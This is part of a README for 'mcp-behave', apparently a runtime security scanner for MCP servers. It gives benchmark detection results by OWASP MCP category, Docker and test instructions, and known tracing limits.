| Metric | Baseline (Pre-hardening) | Hardened Engine (`mcp-behave`) | Improvement |
| :--- | :---: | :---: | :---: |
| **Total Test Servers** | 60 | 60 | — |
| **True Positives (TP)** | 13 | **31** | **+138%** |
| **False Positives (FP)** | 4 | **0** | **-100% (Zero FP)** |
| **False Negatives (FN)** | 28 | **10** | **-64%** |
| **True Negatives (TN)** | 15 | **19** | **100% Benign Clean** |
| **Precision** | 76.5% | **100.0%** | **+23.5%** |
| **Recall** | 31.7% | **75.6%** | **+43.9%** |
| **Accuracy** | 46.7% | **83.3%** | **+36.6%** |
| **F1 Score** | 44.8% | **86.1%** | **+41.3%** |

#### OWASP MCP Top 10 Category Breakdown

| OWASP Category | Malicious | Benign | TP | FP | FN | TN | Recall | Precision |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| **MCP01: Token Mismanagement & Secret Exposure** | 6 | 2 | 6 | 0 | 0 | 2 | **100.0%** | **100.0%** |
| **MCP02: Privilege Escalation via Scope Creep** | 6 | 2 | 6 | 0 | 0 | 2 | **100.0%** | **100.0%** |
| **MCP04: Software Supply Chain Attacks** | 5 | 4 | 5 | 0 | 0 | 4 | **100.0%** | **100.0%** |
| **MCP06: Intent Flow Subversion** | 5 | 2 | 5 | 0 | 0 | 2 | **100.0%** | **100.0%** |
| **MCP07: Insufficient Authentication & Authorization** | 7 | 3 | 2 | 0 | 5 | 3 | **28.6%** | **100.0%** |
| **MCP08: Lack of Audit & Telemetry** | 5 | 2 | 0 | 0 | 5 | 2 | **0.0%** *(AST only)* | **100.0%** |
| **MCP09: Shadow MCP Servers** | 2 | 2 | 2 | 0 | 0 | 2 | **100.0%** | **100.0%** |
| **MCP10: Context Injection & Over-Sharing** | 5 | 2 | 5 | 0 | 0 | 2 | **100.0%** | **100.0%** |
| **Overall** | **41** | **19** | **31** | **0** | **10** | **19** | **75.6%** | **100.0%** |

*See full details in the [Pluto Visibility Benchmark Report](docs/benchmarks/pluto_visibility_bench.md) or run `python benchmarks/run_pluto_bench.py`.*

## Docker (works on macOS / Windows hosts)

```bash
docker build -t mcp-behave .
# default: runs the bundled leaky target so you can see findings immediately
docker run --rm mcp-behave
# point at a real server
docker run --rm mcp-behave python -m mcp_server_fetch
```

The container automatically compiles and runs the native `LD_PRELOAD` tracer
without needing `--cap-add=SYS_PTRACE`. If you explicitly use `--tracer strace`,
`--cap-add=SYS_PTRACE` is required.

The image bundles Node.js (for `npx` servers), `uv` (for `uvx` servers), and
sandbox canary files (`sandbox_home/`) mounted as `$HOME` so credential reads
are detectable.

## Development

```bash
pip install -e ".[test]"
pytest -v
```

CI tests across Ubuntu and macOS; see `.github/workflows/ci.yml`.

## Known limits

- **Runtime tracing operates at libc interposition level.** macOS (DYLD interposition) and Linux (LD_PRELOAD) intercept standard dynamic runtime library calls (Python, Node.js, Ruby). Statically linked binaries (e.g. Go, musl Rust) and inline assembly syscalls bypass libc interposition unless run under the Linux `strace` tracer (`--tracer strace`) or the planned kernel eBPF backend — see [ROADMAP.md](ROADMAP.md).
- **stdio is the primary transport with full runtime tracing.** `sse` and `streamable-http` connect to remote servers where client-side process tracing is not available; manifest analysis, CSA rule linting, and rug-pull detection run there.
- **Canary & Fuzzing synthesis** — generates realistic, diverse arguments across `--probe-rounds` and adversarial boundary vectors with `--fuzz`. Full property-based hypothesis fuzzing is planned for v0.4.x.

## License

MIT. See [LICENSE](LICENSE).
